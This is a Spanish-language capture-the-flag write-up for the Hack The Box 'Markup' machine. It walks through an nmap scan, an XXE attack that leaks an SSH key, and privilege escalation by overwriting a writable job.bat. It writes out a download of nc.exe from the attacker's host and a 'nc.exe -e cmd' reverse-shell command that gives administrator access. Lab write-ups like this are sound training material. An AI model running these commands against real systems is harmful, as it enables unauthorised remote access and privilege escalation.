---
tags:
title: Markup - Easy (HTB)
permalink: /Markup-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sC -sV -p 22,80,443 10.129.95.192     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 05:14 EDT  
Nmap scan report for 10.129.95.192  
Host is up (0.084s latency).  
  
PORT    STATE SERVICE  VERSION  
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)  
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)  
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)  
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)  
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28  
|_http-title: MegaShopping  
| http-cookie-flags:   
|   /:   
|     PHPSESSID:   
|_      httponly flag not set  
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)  
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28  
|_ssl-date: TLS randomness does not represent time  
| http-cookie-flags:   
|   /:   
|     PHPSESSID:   
|_      httponly flag not set  
| ssl-cert: Subject: commonName=localhost  
| Not valid before: 2009-11-10T23:48:47  
|_Not valid after:  2019-11-08T23:48:47  
|_http-title: MegaShopping  
| tls-alpn:   
|_  http/1.1  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
```

# Service enumeration

### HTTP / Port 80

![[Untitled 86.jpg]]

Vemos que en la pagina principal tenemos un panel de login pero sin credecianles no podemos entrar.

### HTTPS / Port 443 SSL

A ver el contenido de la pagina web pero esta ves por `SSL` vemos un contenido distinto al de la pagina principal.

![[Untitled 87.jpg]]

Dentro de esta pagina no tenemos casi nada, excepto la seccino de order por detras se procesan solicitudes `XML`.

## Shell as daniel
### XXE (XML External Identity )

Por lo que podriamos intentar insertar una identidad 

![[Untitled 88.jpg]]

Vemos que efectivamente podemos ver la clave `id_rsa`.

```bash
ssh daniel@10.129.95.192 -i id_rsa 
The authenticity of host '10.129.95.192 (10.129.95.192)' can't be established.
ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.192' (ED25519) to the list of known hosts.

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

Dentro del directorio raiz `C:\` hay una carpeta llamada `Log-Manegement` hay un archivo `job.bat`

```powershell
daniel@MARKUP C:\Log-Management>type job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

Mirando los permiso de este archivo.

```powershell
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Vemos que tenemos permisos de escritura asi que podriamos inyectar comandos a ejecutar como por ejmeplo un comando de `nc.exe` para recibir una `Reverse shell`.

Descargamos el `nc.exe` primero

```powershell
iwr -uri http://10.10.16.19:8888/nc.exe -Outfile C:\Log-Management\nc.exe
```

Y ahora inyectamos el comando, para luego ejecutar el script
```powershell
echo C:\Log-Management\nc.exe -e cmd 10.10.16.19 443 > C:\Log-Management\job.bat

daniel@MARKUP C:\Log-Management>.\job.bat

daniel@MARKUP C:\Log-Management>C:\Log-Management\nc.exe -e cmd 10.10.16.19 443
```

Y desde nuestra shell con `nc` recibimos una shell como `administrator`.

```powershell
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.95.192] 49853
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\administrator
```

`~Happy Hacking.`



